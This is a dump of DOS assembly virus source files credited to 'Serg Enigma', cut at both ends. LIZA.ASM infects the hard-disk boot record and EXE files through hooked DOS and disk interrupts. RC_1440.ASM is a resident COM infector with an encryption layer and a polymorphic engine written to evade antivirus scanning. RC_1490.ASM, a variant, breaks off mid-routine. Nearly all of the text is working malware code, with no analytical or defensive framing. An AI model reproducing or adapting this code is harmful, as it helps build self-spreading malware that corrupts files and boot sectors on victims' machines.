	mov     di,0100h
	push    di
	ret
rt     ENDP
sc      ENDP
END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_458.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[LIZA.ASM]ƒƒƒ
;14:10 16.06.1998
;Copyright by Serg Enigma

	.model tiny
	.186
	.code
	org 0h
start:
	call delta
_delta:
;========================== BOOT CODE ========
boot:	cli
	xor ax,ax
	mov ss,ax
	mov sp,7c00h
	mov ds,ax
	sub word ptr ds:[413h],4
	int 12h
	mov cl,6
	shl ax,cl
	push ax
	mov es,ax
	xor bx,bx
	mov ax,0204h
	mov cx,2
	mov dx,80h
	int 13h
	mov ax,offset itercept_1ch&13h&21h
	push ax
	retf
boot_lng EQU $-offset boot
new_i1c:
	pushf
	push ax cx ds
	xor cx,cx
	mov ds,cx
	mov ax,ds:[21h*4][2]
	cmp ah,8h
	ja non_intercept_i21
	mov ax,offset tmp_21

	xchg ax,word ptr ds:[21h*4]
	mov word ptr cs:[old_21ip],ax
	push cs
	pop ax
	xchg ax,word ptr ds:[21h*4][2]
	mov word ptr cs:[old_21cs],ax

	mov cx,cs:[old_1cip]
	mov ds:[1ch*4],cx
	mov cx,cs:[old_1ccs]
	mov ds:[1ch*4][2],cx
non_intercept_i21:
	pop ds cx ax
	popf
	iret

itercept_1ch&13h&21h:
	xor ax,ax
	mov ds,ax
	mov ax,offset new_i1c
	cli
	xchg ax,word ptr ds:[1ch*4]
	mov word ptr cs:[old_1cip],ax
	push cs
	pop ax
	xchg ax,word ptr ds:[1ch*4][2]
	mov word ptr cs:[old_1ccs],ax
	sti
	
	xor ax,ax
	mov es,ax
	push es
	mov bx,7c00h
	push bx
	mov ax,0201h
	mov cx,1234h	;> Plase of old boot!!!
old_boot equ $-2
	mov dx,80h
	int 13h
	retf
;========================== DATA =============
int_21h:	pushf
		cli
		db	09ah
old_21ip	dw	0
old_21cs	dw	0
		ret

old_1cip	dw	0
old_1ccs	dw	0

int_13h:	pushf
		cli
		db	09ah
old_13ip	dw	0
old_13cs	dw	0
		ret
;=============================================
delta:
	mov ax,0deadh
	pop bp
	int 21h
	sub bp,offset _delta
	cmp di,0deadh
	jz exit_exe
install:
	mov ax,3513h
	int 21h
	mov cs:[old_13ip][bp],bx
	mov cs:[old_13cs][bp],es
	push cs
	pop es
	push cs
	pop ds

	mov ah,8h
	mov dx,80h
	call int_13h
	and cx,3fh
	sub cx,7h
	mov word ptr cs:[old_boot],cx
	lea bx,offset old_exe_header+[bp]
	mov ax,0201h
	mov cx,1
	mov dx,80h
	call int_13h
	cmp word ptr ds:[old_exe_header+0fh][bp],12cdh
	jz already_infected_boot
	mov ax,0301h
	mov cx,word ptr ds:[old_boot]
	mov dx,80h
	call int_13h
	jc error
	mov ax,0304h	;> how many sectors to write!!!
	mov cx,2
	lea bx,offset start+[bp]
	mov dx,80h
	call int_13h
	jc error
	mov cx,boot_lng
	lea si,offset boot+[bp]
	lea di,offset old_exe_header+[bp]
	push di
	rep movsb
	pop bx
	mov ax,0301h
	mov cx,1h
	mov dx,80h
	call int_13h
already_infected_boot:
error:
exit_exe:
	mov ah,51h
	int 21h
	mov es,bx
	mov ds,bx
	mov ax,bx
	add ax,1234h
old_exe_ss	equ	$-2
	add ax,10h
	mov ss,ax
	mov sp,1234h
old_exe_sp	equ	$-2
	mov di,sp
	add bx,1234h
old_exe_cs	equ	$-2
	add bx,10h
	push bx
	mov bx,1234h
old_exe_ip	equ	$-2
	mov si,bx
	push bx
	xor ax,ax
	mov bx,ax
	xor bp,bp
	mov cx,0ffh
	mov dx,ds
	retf
	db	'[Serg Enigma]'
tmp_21:
	pushf
	push ax bx cx dx di si es ds bp
	push cs
	pop ds
	cmp ax,4b00h
	jnz e_tmp_21
	mov ah,48h
	mov bx,(body+100)/16
	pushf
	call dword ptr cs:[old_21ip]
	jc e_tmp_21
	mov es,ax
	xor si,si
	mov di,si
	mov cx,body
	cld
	rep movsb
	dec ax
	mov ds,ax
	mov word ptr ds:[1],8
	mov ds,cx
	mov word ptr ds:[21h*4],offset new_21
	mov word ptr ds:[21h*4][2],es
	mov word ptr ds:[413h],280h
e_tmp_21:
	pop bp ds es si di dx cx bx ax
	popf
	jmp dword ptr cs:[old_21ip]

new_21:		pushf
		cmp ax,0deadh
		jz we_are_here
		cmp cs:[handle],0
		jnz look_close
		cmp ah,3ch
		jz test_file
		cmp ah,5bh
		jz test_file
ret_i21h:	popf
		jmp dword ptr cs:[old_21ip]
we_are_here:	xchg ax,di
exit_i21h:	popf
		iret
test_file:
		push ax bx cx dx di si es ds bp
		mov si,dx
		cld
search:		lodsb
		or al,al
		jnz search
		sub si,5
		lodsb
		cmp al,'.'
		jnz not_my
		lodsw
		or ax,2020h
		mov cx,ax
		lodsb
		or al,20h
		cmp cx,'oc'
		jnz _exe_
		cmp al,'m'
		jmp good
_exe_:		cmp cx,'xe'
		jnz not_my
		cmp al,'e'
good:		jnz not_my
		pop bp ds es si di dx cx bx ax
		popf
		call int_21h
		mov cs:[handle],ax
		jnc e0001
		mov cs:[handle],0
e0001:		retf 2

not_my:		pop bp ds es si di dx cx bx ax
		jmp ret_i21h

handle	dw	0

look_close:
	cmp ah,3eh
	jz test_handle
	jmp ret_i21h
test_handle:
	cmp cs:[handle],bx
	jz inf_proc
	jmp ret_i21h
inf_proc:
	push ax bx cx dx di si es ds bp
	push cs
	pop ds
	mov ax,4200h
	xor dx,dx
	xor cx,cx
	call int_21h
	mov ah,3fh
	mov cx,1ch
	mov dx,offset old_exe_header
	call int_21h
	jnc look_our_files
	jmp exit_virus
	db	'Liza'
look_our_files:
	cmp word ptr ds:[_MZ_],'ZM'
	jz infect
	cmp word ptr ds:[_MZ_],'MZ'
	jz  infect
	jmp exit_virus
	db	'34?-4732'
infect:
	cmp ds:[CRC],'SE'
	jnz _cool
	jmp exit_virus
_cool:	mov ds:[CRC],'SE'
	mov si,SS_offset_paragr
	mov word ptr old_exe_SS,si
	mov si,SP_offset
	mov word ptr old_exe_SP,si

	mov si,CS_offset_paragr
	mov word ptr old_exe_CS,si
	mov si,IP_offset
	mov word ptr old_exe_IP,si

	mov ax,4202h
	xor cx,cx
	xor dx,dx
	call int_21h
	xchg ax,di
	xchg dx,si

	mov ax,lng_of_file_page
	dec ax
	mov cx,200h
	mul cx
	add ax,byte_on_last_page
	adc ax,0
	cmp ax,di
	jnz exit_virus
	cmp dx,si
	jnz exit_virus
	push ax
	push dx
	mov cx,10h
	div cx
	sub ax,header_size
	mov ip_offset,dx
	mov cs_offset_paragr,ax
	add dx,body+100h
	mov sp_offset,dx
	mov ss_offset_paragr,ax
	pop dx
	pop ax
	add ax,body
	adc dx,0
	mov cx,200h
	div cx
	or dx,dx
	jz not_inc
	inc ax
not_inc:
	mov byte_on_last_page,dx
	mov lng_of_file_page,ax
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	call int_21h
	mov ah,40h
	mov cx,body
	mov dx,offset start
	call int_21h
	jc exit_virus
	mov ax,4200h
	xor cx,cx
	xor dx,dx
	call int_21h
	mov ah,40h
	mov cx,1ch
	mov dx,offset old_exe_header
	call int_21h
exit_virus:
	pop bp ds es si di dx cx bx ax
	mov cs:[handle],0
	jmp ret_i21h

;tsr_lng	=	$-offset virus
body	=	$-offset start
old_exe_header:
_MZ_				dw	0
byte_on_last_page		dw	0
lng_of_file_page		dw	0
relocation_counter		dw	0
header_size			dw	0
min_paragraf			dw	0
max_paragraf			dw	0
SS_offset_paragr		dw	0
SP_offset			dw	0
CRC				dw	0
IP_offset			dw	0
CS_offset_paragr		dw	0
relocation_offset		dw	0
overlay_number			db	0

_end:
end start
endƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[LIZA.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RC_1440.ASM]ƒƒƒ
; TSR com infector · ØÆ´®¨Æ‡‰®™ £•≠•‡†‚Æ‡Æ¨ [IDA] v_0.01.
;                             Wait for next versions !!!
;
;Copyright by Serg_Enigma
;
	.MODEL tiny
	.386p            ;             ⁄ƒƒƒƒƒƒƒƒø
	.code            ;             ≥ AdInf  ≥
	org 100h         ;             ≥  MUST  ≥
start:                   ;             ≥   DIE  ≥
	jmp     sc       ;             ¿ƒƒƒƒƒƒƒƒŸ
	db      200d dup(08h)
sc      PROC
	Call    Get_offset
Get_offset:     Pop     Bp
	Sub     Bp,offset Get_offset
	Mov	Dx,0000h
	Lea	Si,offset dat+[Bp]
	Mov	Cx,lng_II-2
Dream:	Xor	word ptr [Si],Dx
	Add	Dx,'SE'
	Inc	Si
	Loop	dream


Dat:	Mov     Ax,0deadh
	Int     21h
	Cmp     Di,1996h
	Je      Rt
	Mov     Bx,Es
	Dec     Bx
	Mov     Es,Bx
	Mov     byte ptr Es:00,'Z'
	Mov     Ax,word ptr Cs:[02]
	Sub     Ax,mem
	Mov     word ptr Cs:[02],Ax
	Mov     Ax,word ptr es:[03]
	Sub     Ax,mem
	Mov     word ptr es:[03],Ax
	Stc
	Adc     Ax,Bx
	Mov     Es,Ax
	Push    Es
	Mov     Ax,3521h
	Int     21h
	Mov     word ptr Cs:s1 +[Bp],Bx
	Mov     word ptr Cs:s2 +[Bp],Es
	Pop     Es
	Push    Cs
	Pop     Ds
	Lea     Si,Sc+[Bp]
	Xor     Di,Di
	Mov     Cx,Lng
	Cld
	Rep     MovSb
	Mov     Dx,offset res-103h-200d
	Push    Es
	Pop     Ds
	Mov     Ax,2521h
	Int     21h
	Mov     Ax,351Ch
	Int     21h
	Mov     word ptr Ds:hm-100h-203d,Bx
	Mov     word ptr Ds:lm-100h-203d,Es
	Mov     Dx,offset int_1c - 103h - 200d
	Mov     Ah,25h
	Int     21h
rt:
	Push    Cs
	Pop     Ds
	Push    Cs
	Pop     Es
	Lea     Si,Buf_j+[Bp]
	Mov     Di,100h
;       Push    Di
	MovSw
	MovSb
	Xor     Ax,Ax
	Xor     Cx,Cx
	Cwd
	Mov     Bx,Dx
	Push    100h
	Ret

Res:    Pushf
	Push    Ax
	Push    Bx
	Push    Cx
	Push    Dx
	Push    Ds
	Push    Es
	Push    Si
	Push    Di
	Cmp     Ax,4b00h ;run
	Jz      Get_name
	Cmp     Ah,56h   ;rename
	Jz      Get_name
	Cmp     Ah,3dh   ;open
	Jz      Get_name
	Cmp     Ah,43h   ;atribut
	Jz      Get_name
	Jmp     Exit

Get_name:
	Clc
	Mov     Cx,128
	Xor     Al,Al
	Mov     Di,Dx
z1:     Cmp     Al,Ds:[Di]
	Je      lng_ext
	Inc     Di
	Loop    z1
	Jmp     Exit
lng_ext:
	Sub     Di,4
	Mov     Al,'.'
	Cmp     Al,Ds:[Di]
	je      Test_ext
	Jmp     Exit
Test_ext:
	Mov     Si,Di
	Sub     Si,6
	Mov     Ax,Ds:[Si]
	And     Ax,0dfdfh
	Cmp     Ax,'BI'
	Je      Ex
	Inc     Di
	Mov     Al,Ds:[Di]
	And     Al,0dfh
	Cmp     Al,'C'
	Jne     Ex
	Inc     Di
	Mov     Al,Ds:[Di]
	And     Al,0dfh
	Cmp     Al,'O'
	Jne     Ex
	Inc     Di
	Mov     Al,Ds:[Di]
	And     Al,0dfh
	Cmp     Al,'M'
	Je      Infect
Ex:     Jmp     Exit

infect:
	Call    set_24
	Mov     Ax,4300h
	Call    Intr21
	Xor     Ch,Ch
	And     Cx,0fffeh
	Mov     Ax,4301h
	Call    Intr21
	Mov     Ax,3d02h
	Call    Intr21
	Jc      late
	Xchg    Ax,Bx
	Mov     Ax,4200h
	Call    move
	Push    Cs
	Pop     Ds
	Mov     Ah,3fh
	Mov     Cx,3h
	Mov     Dx,offset Buf_j - 100h - 203d
	Call    Intr21
	Cmp     word ptr buf_j-100h-203d,'ZM'
	Jz      Close
	Mov     Ax,5700h
	Call    Intr21
	Mov     word ptr time-100h-203d,Cx
	Mov     word ptr date-100h-203d,Dx
	Mov     Ax,4202h
	Mov     Dx,-02h
	Mov     Cx,0ffffh
	Call    Intr21
	Mov     Ah,3fh
	Mov     Cx,02h
	Mov     Dx,offset buffer-100h-203d
	Call    Intr21
	Mov     Si,Dx
	Mov     Dx,word ptr ID-100h-203d
	Cmp     word ptr [Si],Dx
	Je      Close
	Mov     Ax,4200h
	Call    move
	Mov     Ax,4202h
	Call    move
	Cmp     Ax,62000d
	ja      close
	Cmp     Ax,100h
	jb      close
	Mov     word ptr _size-100h-203d,Ax
	Sub     Ax,03h
	Mov     word ptr New_j-100h-202d,Ax


;################################## [IDA] v_0.01 ##############################
	Push    Bx
	Call    Poly
	Pop     Bx              ;                 #############################
	Cmp	Ax,0ffffh
	je	Close

	Mov     Ah,40h          ;                 #
	Xor     Dx,Dx           ;                 #
	Mov     Cx,D_last - 100h-203 ;            #
	Push    Es              ;                 #
	Pop     Ds              ;                 #
	Call    Intr21          ;                 #
;#########################################        #
	Mov     Ah,40h          ;        #        #
	Mov     Dx,100h         ;        #        #
	Mov     Cx,lng          ;        #        #
	Call    Intr21          ;        #        #
;#########################################        #
	Mov     Ah,49h  ;                         #
	Call    intr21  ;                         #
	Push    Cs      ;                         #
	Pop     Ds      ;                         #
;##################################################
			       
	Mov     Ax,4200h
	Call    move
	Mov     Ah,40h
	Mov     Dx,offset New_j-100h-203d
	Mov     Cx,3h
	Call    Intr21
	Mov     Ax,5701h
	Mov     Dx,word ptr cs:date-100h-203d
	Mov     Cx,word ptr cs:time-100h-203d
	Call    Intr21
Close:
	Mov     Ah,3eh
	Call    Intr21
Late:   Push    Cs
	Pop     Ds
	Mov     Dx,word ptr Old_24 - 100h - 203d
	Push    word ptr Old_24a - 100h - 203d
	Pop     Ds
	Mov     Ax,2524h
	Call    Intr21
Exit:   Pop     Di
	Pop     Si
	Pop     Es
	Pop     Ds
	Pop     Dx
	Pop     Cx
	Pop     Bx
	Pop     Ax
	Cmp     Ax,0deadh
	Je      Ok
	Popf

Old_21:
	Jmp     dword ptr Cs:s1-100h-203d
;==============================================================
set_24: Push    Ds
	Push    Dx
	Push    Bx
	Push    Es
	Mov     Ax,3524h
	Call    Intr21
	Push    Cs
	Pop     Ds
	Mov     word ptr old_24 - 100h - 203d,Bx
	Mov     word ptr old_24a - 100h - 203d,Es
	Mov     Ah,25h
	Mov     Dx,offset New_24 - 100h - 203d
	Call    Intr21
	Pop     Es
	Pop     Bx
	Pop     Dx
	Pop     Ds
	Ret

New_24: Mov     Al,3
	Iret

ok:     Mov     Di,1996h
	Popf
	Iret

Buf_j   db      0cdh,20h,90h
New_j   db      0e9h,00h,00h

date    dw      ?
time    dw      ?

move:   Xor     Cx,Cx
	Cwd
	Call    Intr21
	ret
intr21:
	Pushf
	db      09ah
s1      dw      ?
s2      dw      ?
	Ret

int_1c: push    ds
	push    es
	push    ax
	push    dx
	push    cx
	push    di
	push    si
	cmp     byte ptr cs:data_3e,0
	jae     loc_1
	jmp     short loc_8

Mes     db      'IVeronika !'
mes_lng =       $-offset Mes
data_2e db      'VERA'
data_3e db      14h

loc_1:  mov     byte ptr cs:data_3e-100h-203d,14h
	mov     ax,0B800h
	mov     es,ax
	mov     di,0fa0h
loc_2:  sub     di,8
	clc
loc_3:  mov     al,es:[di]
	and     al,0DFh
	cmp     al,56h  ; 'V'
	je      loc_5
loc_4:  dec     di
	dec     di
	cmp     di,1388h
	jb      loc_3
	jmp     short loc_9
loc_5:  mov     cx,4
	mov     si,offset data_2e - 100h - 203d
	push    cs
	pop     ds
	cld
loop_6: mov     al,es:[di]
	and     al,0DFh
	cmp     [si],al
	jne     loc_2
	inc     di
	inc     di
	inc     si
	loop    loop_6
	mov     cx,mes_lng
	sub     di,8
	mov     si,offset Mes - 100h - 203d
loop_7: movsb
	inc     di
	loop    loop_7
loc_8:  dec     byte ptr cs:data_3e -100h-203d
loc_9:  pop     si
	pop     di
	pop     cx
	pop     dx
	pop     ax
	pop     es
	pop     ds
Old_1c:
	db      0eah
hm      dw      ?
lm      dw      ?

_size   dw      ?

Old_24  dw      ?
Old_24a dw      ?

;########################## [IDA]'s Subprograms ###############################
Poly:           Mov     Ah,48h                  ;
		Mov     Bx,mem+80h                    ;
		Call    intr21                    ;
		jnc	You
		Mov	Ax,0ffffh
		Ret
You:		Mov     Es,Ax                     ;
		Mov     word ptr new_seg-100h-203d,Ax ;
		Mov     word ptr D_lng-100h-203d,0    ;
		Mov     word ptr D0lng-100h-203d,0    ;
Big:            Call    Get_rnd                 ;
		Mov     Ax,000fh                ;
		Call    Get_off                 ;
		Or      Di,Di                   ;
		Jz      Big                     ;
		Mov     Cx,Di                   ;
		Xor     Di,Di                   ;
Gen_com:        Push    Di                      ;
		Call    Get_rnd                 ;
		Mov     Ax,0025                 ;
		Call    Get_off                 ;
		Lea     Si,[Di]+one_b_op-100h-203d    ;
		Pop     Di                      ;
		Cld
		LodSb                           ;
		StoSb                           ;
		Loop    Gen_com                 ;
		Mov     word ptr D_lng-100h-203d,Di  ;########################## 1
		Call    Get_rnd                 ;
		Mov     Ax,17                   ;
		Call    Get_off                 ;
		Mov     Ax,7h                   ;
		Mul     Di                      ;
		Push    Es                      ;
		Push    Cs                      ;
		Pop     Es
		Mov     Si,offset log_op - 100h-203d
		Add     Si,Ax
		Mov     word ptr cm_off-100h-203d,Si
		Mov     Di,offset com_buf - 100h-203d
		Cld
		MovSw
		Pop     Es
		Call    Set_op                  ;creating table
		Cmp     byte ptr m2-100h-203d,0
		Je      one_com
		Mov     Di,word ptr D_lng-100h-203d
		Mov     Si,offset m2-100h-203d
		LodSb
		StoSb
		Inc     Di
		Inc     Di
		Call    Gen_Gar
		Add     word ptr D0lng-100h-203d,3
one_com:        Mov     Di,word ptr D_lng-100h-203d
		Add     Di,word ptr D0lng-100h-203d
		Mov     word ptr D_lng1-100h-203d,Di ;######################## 2
		Mov     Si,offset m1-100h-203d
		Cld
		LodSb
		StoSb
		Inc     Di
		Inc     Di
		Call    Gen_Gar
		Mov     Si,offset com_buf-100h-203d
		Cld
		LodSw
		StoSw
		Call    Gen_Gar
		Mov     Si,word ptr cm_off-100h-203d
		Add     Si,5
		Cld
		LodSb
		StoSb
		Call    Gen_Gar
		Mov     word ptr D_lng2-100h-203d,Di ;###################### 3
		Mov     Si,offset _cmp-100h-203d
		Cld
		LodSw
		StoSw
		Inc     Di
		Inc     Di
		Call    Gen_Gar
		Mov     Si,offset Jx1-100h-203d
		Mov     word ptr D_lng4-100h-203d,Di ;###### Jb / Loop ###### 4
		Cld
		LodSw
		StoSw
		Call    Gen_Gar
		Mov     word ptr D_last-100h-203d,Di

		Mov     Di,word ptr D_lng-100h-203d
		Inc     Di
		Call    Get_rnd
		clc
		Mov     word ptr es:[Di],Bx
		Mov     Di,word ptr D_lng1-100h-203d
		Inc     Di
		Mov     word ptr es:[Di],100h

		Mov     Di,word ptr D_lng2-100h-203d ; cmp xx,offset end
		Inc     Di
		Inc     Di
		Mov     word ptr es:[Di],lng+0fdh ; not crypt last 3 byte of ID 

		Mov     Di,word ptr D_lng4-100h-203d
		Inc     Di
		Mov     Ax,word ptr D_lng4-100h-203d
		Sub     Ax,word ptr D_lng1-100h-203d
		Mov     Bl,01h
		Sub     Bl,Al
		Mov     byte ptr es:[Di],Bl
		Mov     Cx,lng
		Mov     Si,offset Sc-100h-203d
		Mov     Di,100h
		Rep     MovSb

		Mov	Di,offset dat-203d
		Mov	Cx,lng_II-2
		Call	Get_rnd
		Mov	word ptr Es:[109h],Bx ;###############   ##############
Drug:		Xor	word ptr Es:[Di],Bx
		Add	Bx,'SE'
		Inc	Di
		Loop	Drug

		Mov     Di,D_last-100h-203d
		Mov     byte ptr Es:[Di],0cbh
		Push    Ds
		Push    Es
		Pop     Ds

		Pushf
		Push	Bp
		db      09ah
		dw      0
new_seg         dw      ?
		Pop	Bp
		Popf

		Pop     Ds
		Mov     Dx,word ptr _size-100h-203d
		Add     Dx,word ptr D_last-100h-203d
		Mov     Di,word ptr D_lng1-100h-203d
		Inc     Di
		Add     Dx,100h
		Mov     word ptr es:[Di],Dx
		Add     Dx,Lng
		Mov     Di,word ptr D_lng2-100h-203d
		Inc     Di
		Inc     Di
		Sub     Dx,3
		Mov     word ptr es:[Di],Dx
		Ret

one_b_op        db      040h                    ; Inc Ax
		db      041h                    ; Inc Cx
		db      042h                    ; inc dx
		db      043h                    ; inc bx*
		db      045h                    ; inc bp
		db      046h                    ; inc si*
		db      047h                    ; inc di*
		db      048h                    ; dec ax
		db      049h                    ; dec cx
		db      04ah                    ; dec dx
		db      04bh                    ; dec bx*
		db      04dh                    ; dec bp
		db      04eh                    ; dec si*
		db      04fh                    ; dec di*
		nop     
		nop     
		cld
		cbw
		cld
		nop     
		db      090h                    ; Nop
		db      026h                    ;
		db      03Eh                    ;
		db      042h                    ;
		db      02Eh                    ;

log_op  db      0F6h, 14h  ,0feh,0beh,000h,046h,04eh ;0        Not b,[Si]
	db      0F6h, 15h  ,0ffh,0bfh,000h,047h,04fh ;1        Not b,[Di]
	db      0F6h, 17h  ,0fbh,0bbh,000h,043h,04bh ;2        Not b,[Bx]
	db      0F6h, 1Ch  ,0feh,0beh,000h,046h,04eh ;3        Neg b,[Si]
	db      0F6h, 1Dh  ,0ffh,0bfh,000h,047h,04fh ;4        Neg b,[Di]
	db      0F6h, 1Fh  ,0fbh,0bbh,000h,043h,04bh ;5        Neg b,[Bx]

	db      031h, 04h  ,0feh,0beh,0b8h,046h,04eh ;6        Xor w,[Si],Ax
	db      031h, 05h  ,0ffh,0bfh,0b8h,047h,04fh ;7        Xor w,[Di],Ax
	db      031h, 07h  ,0fbh,0bbh,0b8h,043h,04bh ;8        Xor w,[Bx],Ax
	db      031h, 0Ch  ,0feh,0beh,0b9h,046h,04eh ;9        Xor w,[Si],Cx
	db      031h, 0Dh  ,0ffh,0bfh,0b9h,047h,04fh ;10       Xor w,[Di],Cx
	db      031h, 0Fh  ,0fbh,0bbh,0b9h,043h,04bh ;11       Xor w,[Bx],Cx
	db      031h, 14h  ,0feh,0beh,0bah,046h,04eh ;12       Xor w,[Si],Dx
	db      031h, 15h  ,0ffh,0bfh,0bah,047h,04fh ;13       Xor w,[Di],Dx
	db      031h, 17h  ,0fbh,0bbh,0bah,043h,04bh ;14       Xor w,[Bx],Dx
	db      031h, 1Ch  ,0feh,0beh,0bbh,046h,04eh ;15       Xor w,[Si],Bx
	db      031h, 1Dh  ,0ffh,0bfh,0bbh,047h,04fh ;16       Xor w,[Di],Bx
Jx1     db      072h, 00h               ; Jb yy
;Jx2     db      0e2h, 00h               ; Loop yy

copyright       db      0,'[IDA] v0.01',0,'Serg_Enigma',0
;message                db      'à Ì‚Æ •ÈÒ ≠• ¢·Ò... 1997£'
D0lng           dw      0       ;
D_lng           dw      0       ; ë¨•È•≠®• ≠† Mov ??,???? = 1
D_lng1          dw      0       ; ë¨•È•≠®• ≠† Mov ??,???? = 2
D_lng2          dw      0       ; ë¨•È•≠®• ≠† Cmp ??,????
D_last          dw      0       ; ë¨•È•≠®• ≠† ØÆ·´•§≠®© °†©‚ CRYPT'†
D_lng4          dw      ?       ; OFFSET Jb yy
Count           db      ?
_Cmp            db      081h
_c              db      0
m1              db      0
m2              db      0
ni1             db      0
ni2             db      0
;ni3            db      0
;ni4            db      0
Com_buf         dw      ?
Data            dw      ?
Cm_off          dw      ?

Set_op:         Push    Es
		Push    Cs
		Pop     Es
		Push    Di
		Push    Si
		Mov     Si,word ptr cm_off-100h-203d
		Inc     Si
		Inc     Si
		Mov     Di,offset _c-100h-203d
		mov	cx,5
		rep	movsb
		Pop     Si
		Pop     Di
		Pop     Es
		Ret

Gen_gar:        Xchg    Di,Dx
gar:            Call    Get_rnd         ;
		Mov     Ax,000fh
		Call    Get_off
		Or      Di,Di
		Jz      gar
		Mov     Cx,Di
		Mov     word ptr D0lng-100h-203d,Cx  ; Ñ´®≠≠† 2
ag2:            Call    Get_rnd
		Mov     Ax,0025
		Call    Get_off
		Lea     Si,[Di]+one_b_op-100h-203d
		LodSb
		Cmp     Al,byte ptr ni1-100h-203d
		Je      ag2
		Cmp     Al,byte ptr ni2-100h-203d
		Je      ag2
		Mov     Di,Dx
		Cld
		StoSb
		Mov     Dx,Di
		Loop    ag2     ;Gen_com1
		Ret

Get_off:        
		Push    Ax                      ; di - result
		Push    Bx
		Push    Cx
		Push    Dx
		Xchg    Dx,Bx
		Xor     Bx,Bx
		Mov     Cx,65535
der:            Mov     Bh,Ah  ;start of space
cyc:            call    ser
		Inc     Bh
		Cmp     Bh,Al  ;end of space
		Jnz     cyc
		Loop    der
		ret

_ok:            Xor     Bl,Bl
		Xchg    Bh,Bl
		Mov     Di,Bx
		Pop Dx
		Pop Cx
		Pop Bx
		Pop Ax
		Cld
		Ret
ser:            Inc Bl
		Cmp Bl,Dl
		Jz fc
		Ret
fc:             Pop Cx
		Jmp _ok

Get_rnd:        Push    Ax              ; bx - random number
		Push    Dx
		Push    Es
		Push    Di
		Push    Cx
		In      Ax,[40h]
		Xchg    Ax,Dx
		Inc     byte ptr Count-100h-203d
		Mov     Ax,0f800h
		Mov     Es,Ax
		Mov     Di,word ptr Data-100h-203d
		Xor     Dx,word ptr Es:[Di]
		Mov     word ptr Data+100h-203d,Dx
		Mov     Cl,byte ptr Count+100h-203d
		Rol     Dx,Cl
		Mov     Bx,Dx
		Pop     Cx
		Pop     Di
		Pop     Es
		Pop     Dx
		Pop     Ax
		Cld
		Ret

;##############################################################################

Buffer  dw      ?
Lng_II	=	$-dat
sc      ENDP
ID      db      ''
Lng     =       $-Sc
mem     =       (Lng/16d)+10
END start
END

; IDDQD
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RC_1440.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RC_1490.ASM]ƒƒƒ
;
;Copyright by Serg_Enigma
;
        .MODEL tiny
        .386p
        .code
        org 100h
start:
        jmp     sc
        db      200d dup(08h)
sc      PROC
        Call    Get_offset
Get_offset:     Pop     Bp
        Sub     Bp,offset Get_offset
        Mov     Dx,0000h
        Jmp     Cycl
Cd:	Xor     Bx,Bx
        Jmp     Cycl
Cr:	Mov     Bh,22h
Cycl:	Lea     si,dat+[Bp]
        Mov     cx,lng_II-2
        Push    Dx
crypt:	Xor     word ptr [Si],Dx
        Inc     Si
        Add     Dx,'SE'
        loop    crypt
        Pop     Dx
	Mov	Cx,106h
        Lea     si,dat+[Bp]
	Xor	Ax,Ax
	Cld
povtor:	LodSb
	Add	Ah,Al
	Loop	povtor	
        Cmp     Ax,8fb8h
        Jz      dat
        Cmp     Bh,22h
        Jne     Cr
        Inc     Dh
        Jmp     Cd

Dat:    Mov     Ax,0deadh
        Int     21h
        Cmp     Di,1996h
        Je      Rt
        Mov     Bx,Es
        Dec     Bx
        Mov     Es,Bx
        Mov     byte ptr Es:00,'Z'
        Mov     Ax,word ptr Cs:[02]
        Sub     Ax,mem
        Mov     word ptr Cs:[02],Ax
        Mov     Ax,word ptr es:[03]
        Sub     Ax,mem
        Mov     word ptr es:[03],Ax
        Stc
        Adc     Ax,Bx
        Mov     Es,Ax
        Push    Es
        Mov     Ax,3521h
        Int     21h
        Mov     word ptr Cs:s1 +[Bp],Bx
        Mov     word ptr Cs:s2 +[Bp],Es
        Pop     Es
        Push    Cs
        Pop     Ds
        Lea     Si,Sc+[Bp]
        Xor     Di,Di
        Mov     Cx,Lng
        Cld
        Rep     MovSb
        Mov     Dx,offset res-103h-200d
        Push    Es
        Pop     Ds
        Mov     Ax,2521h
        Int     21h
        Mov     Ax,351Ch
        Int     21h
        Mov     word ptr Ds:hm-100h-203d,Bx
        Mov     word ptr Ds:lm-100h-203d,Es
        Mov     Dx,offset int_1c - 103h - 200d
        Mov     Ah,25h
        Int     21h
rt:
        Push    Cs
        Pop     Ds
        Push    Cs
        Pop     Es
        Lea     Si,Buf_j+[Bp]
        Mov     Di,100h
;       Push    Di
        MovSw
        MovSb
        Xor     Ax,Ax
        Xor     Cx,Cx
        Cwd
        Mov     Bx,Dx
        Push    100h
        Ret

Res:    Pushf
        Push    Ax
        Push    Bx
        Push    Cx
        Push    Dx
        Push    Ds
        Push    Es
        Push    Si
        Push    Di
        Cmp     Ax,4b00h ;run
        Jz      Get_name
        Cmp     Ah,56h   ;rename
        Jz      Get_name
        Cmp     Ah,3dh   ;open
        Jz      Get_name
        Cmp     Ah,43h   ;atribut
        Jz      Get_name
        Jmp     Exit

Get_name:
        Clc
        Mov     Cx,128
        Xor     Al,Al
        Mov     Di,Dx
